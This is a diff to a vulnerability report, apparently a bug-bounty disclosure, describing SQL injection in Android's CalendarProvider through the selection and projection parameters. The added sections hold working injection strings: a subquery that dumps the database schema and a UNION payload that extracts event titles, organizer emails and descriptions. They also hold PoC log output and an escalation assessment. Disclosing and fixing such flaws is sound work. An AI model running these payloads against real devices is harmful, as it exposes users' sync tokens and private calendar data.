@@ -5,10 +5,11 @@
 The AOSP CalendarProvider (`com.android.providers.calendar`) is vulnerable to SQL injection through the `selection` parameter of `ContentResolver.query()`. Any app with `READ_CALENDAR` permission can exploit this to read internal database tables (`_sync_state`, `CalendarCache`, `sqlite_master`) that are NOT accessible through the CalendarProvider's public Content URI API. This exposes Google account sync tokens, sync timing metadata, timezone/location indicators, and the complete database schema.
 
 **Component:** `com.android.providers.calendar` (CalendarProvider2)  
-**URI:** `content://com.android.calendar/calendars`  
+**Affected URIs:** ALL CalendarProvider URIs — `calendars`, `attendees`, `reminders`, `calendar_alerts`, `instances`, `colors`  
 **Required Permission:** `READ_CALENDAR` (normal runtime permission)  
 **Impact:** Confidentiality — Exposure of sync tokens, account metadata, and internal database state beyond what `READ_CALENDAR` is designed to grant  
-**Severity:** Medium-High (privilege boundary bypass within Calendar data scope)
+**Severity:** Medium-High (privilege boundary bypass within Calendar data scope)  
+**SQLite Version:** 3.50.6 (extensions disabled — no code execution escalation)
 
 ## Device & Environment
 
@@ -188,30 +189,89 @@ adb logcat -s CalendarSQLi:D
 
 4. **Schema Reconnaissance:** Full database schema extraction enables targeted attacks against other content providers or application logic.
 
-## Root Cause
+### Additional Injection Vector: Projection Subquery Injection
 
-The CalendarProvider does not use parameterized queries or input sanitization for the `selection` parameter. The AOSP `CalendarProvider2.java` passes the selection string directly into SQL:
+In addition to the `selection` (WHERE) injection, the CalendarProvider is also vulnerable through the `projection` parameter. Subqueries in column names are not validated:
 
 ```java
-// In query() method
+// Attack 4: Projection subquery — extracts ALL schemas in a single row
+String[] proj = {"(SELECT group_concat(sql,'|||') FROM sqlite_master WHERE type='table') AS leak"};
+Cursor c = getContentResolver().query(
+    Uri.parse("content://com.android.calendar/calendars"),
+    proj, null, null, null);
+// Returns concatenated schemas of all 15 tables in one field
+```
+
+**PoC app logcat output (UID 10361):**
+```
+Subquery projection: 4 rows
+  LEAK: CREATE TABLE android_metadata (locale TEXT)|||CREATE TABLE _sync_state (_id INTEGER PRIMARY KEY,account_name TEXT NOT NULL,account_type TEXT NOT NULL,data TEXT,UNIQUE(account_name, account_type))|||CR...
+```
+
+This means even if the `selection` parameter is sanitized, an attacker can still extract arbitrary data via projection subqueries. Both vectors must be fixed.
+
+### Systemic Vulnerability: ALL CalendarProvider URIs Affected
+
+The SQL injection is not limited to `content://com.android.calendar/calendars`. All CalendarProvider URIs accept unparameterized selection input:
+
+| URI | Columns | SQLi Confirmed |
+|-----|---------|---------------|
+| `/calendars` | 35 | **YES** |
+| `/attendees` | 49 | **YES** |
+| `/reminders` | 4 | **YES** |
+| `/calendar_alerts` | 63 | **YES** |
+| `/instances/when/...` | 63 | **YES** |
+| `/colors` | 7 | **YES** |
+
+Each URI provides a different column count for the UNION SELECT, but all accept the same injection pattern.
+
+### Escalation Assessment
+
+- **Code Execution (`load_extension`):** NOT possible — Android's SQLite build disables `load_extension()` ("no such function")
+- **File Read/Write (`readfile`/`writefile`):** NOT possible — functions not available
+- **ATTACH DATABASE:** Stacked queries not executed through Android's `rawQuery()`
+- **Write Operations:** Require separate `WRITE_CALENDAR` permission — cannot be escalated via read-only SQLi
+
+### Calendar Event Data Extraction via SQLi
+
+The UNION injection also extracts complete event data with organizer emails and descriptions:
+
+```java
+String sel = "1=0) UNION SELECT title||'|'||COALESCE(organizer,'')||'|'||COALESCE(description,''),2,...,35 FROM Events LIMIT 20--";
+```
+
+**Result:** 20 events extracted including titles, organizer email addresses, and full event descriptions — demonstrating that SQLi can extract any column from any internal table.
+
+## Root Cause
+
+The CalendarProvider does not use parameterized queries or input sanitization for either the `selection` or `projection` parameters. The AOSP `CalendarProvider2.java` passes both user-controlled strings directly into SQL:
+
+```java
+// In query() method — BOTH parameters are vulnerable
 qb.query(db, projection, selection, selectionArgs, ...);
-// Where selection is user-controlled and not validated
+// projection (column names) are not validated — subqueries accepted
+// selection (WHERE clause) is not validated — UNION injection accepted
 ```
 
 ## Recommended Fix
 
 1. Use `selectionArgs` for all user-supplied values instead of embedding them in the selection string
 2. Validate the `selection` parameter to reject SQL keywords (`UNION`, `SELECT`, `FROM`, etc.)
-3. Use `SQLiteQueryBuilder.setStrict(true)` to prevent UNION injections
-4. Restrict access to internal tables (`_sync_state`, `CalendarCache`) at the provider level
+3. Validate `projection` column names against an allowlist — reject subqueries and expressions
+4. Use `SQLiteQueryBuilder.setStrict(true)` to prevent both UNION and subquery injections
+5. Restrict access to internal tables (`_sync_state`, `CalendarCache`) at the provider level
 
 ## Evidence Files
 
-- `poc_app/src/com/vrp/poc/CalendarSqliActivity.java` — PoC app source (auto-runs all 3 attacks)
+- `poc_app/src/com/vrp/poc/CalendarSqliActivity.java` — PoC app source (auto-runs WHERE injection tests)
+- `poc_app/src/com/vrp/poc/ExpandedSqliActivity.java` — Projection injection + event extraction tests
 - `poc_app/build/poc.apk` — Signed PoC APK
 - `dynamic_evidence/calendar_sqli_poc_app_logcat.txt` — Logcat from PoC app execution (UID 10361)
+- `dynamic_evidence/calendar_sqli_expanded_logcat.txt` — Logcat showing projection injection + event extraction
+- `dynamic_evidence/calendar_sqli_advanced_logcat.txt` — Advanced escalation tests (load_extension, readfile, all URIs)
 - `dynamic_evidence/calendar_sqli_evidence.txt` — Initial shell-based discovery evidence
 
 ## Timeline
 
 - **2026-09-07:** Vulnerability discovered via ADB shell, proven with PoC app (UID 10361) on Pixel 6a, Android 17 (API 37, security patch 2026-06-05)
+- **2026-09-07:** Second injection vector (projection subquery) confirmed, event data extraction proven
